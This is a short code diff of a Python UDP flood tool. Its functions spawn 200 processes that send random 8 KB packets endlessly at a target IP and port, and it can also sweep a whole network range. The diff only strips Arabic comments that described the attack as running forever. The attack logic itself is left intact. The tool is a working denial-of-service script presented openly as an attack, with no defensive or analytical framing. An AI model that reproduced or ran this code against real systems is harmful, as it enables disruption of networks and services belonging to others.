@@ -35,7 +35,7 @@ def udp_flood(target_ip, target_port):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     data = random._urandom(8192)  
     count = 0
-    while True:  # يستمر الهجوم إلى الأبد
+    while True:  
         client.sendto(data, (target_ip, target_port))  
         count += 1
         if count % 100 == 0:  
@@ -43,14 +43,14 @@ def udp_flood(target_ip, target_port):
 
 def start_attack(target_ip, target_port):
     processes = []
-    for i in range(200):  # عدد العمليات التي سيتم تنفيذها
+    for i in range(200):  
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port))
         process.daemon = True
         processes.append(process)
         process.start()
 
     for process in processes:
-        process.join()  # سيستمر الهجوم بلا توقف
+        process.join()  
 
 def attack_network(network_ip, target_port):
     net = ipaddress.IPv4Network(network_ip, strict=False)
